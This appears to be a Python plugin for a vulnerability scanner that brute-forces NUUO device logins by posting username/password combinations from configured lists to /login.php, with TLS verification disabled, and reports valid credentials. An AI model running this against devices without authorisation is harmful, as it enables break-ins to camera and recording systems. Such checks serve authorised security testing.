import requests

from loguru import logger

from .base import POCTemplate


class NuuoWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['nuuo']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = """"""

    def verify(self, ip, port=80):
        headers = self._get_headers()
        proxies = self._get_proxies()
        for user in self.config.users:
            for password in self.config.passwords:
                data = {
                    'language': 'en',
                    'user': user,
                    'pass': password,
                    'submit': 'Login'
                }
                try:
                    r = requests.post(self._get_url(ip, port, '/login.php'), data=data, timeout=self.config.timeout, headers=headers, verify=False, proxies=proxies)
                    if r.status_code == 200 and 'loginfail' not in r.text:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        pass

POCTemplate.register_poc(NuuoWeakPassword)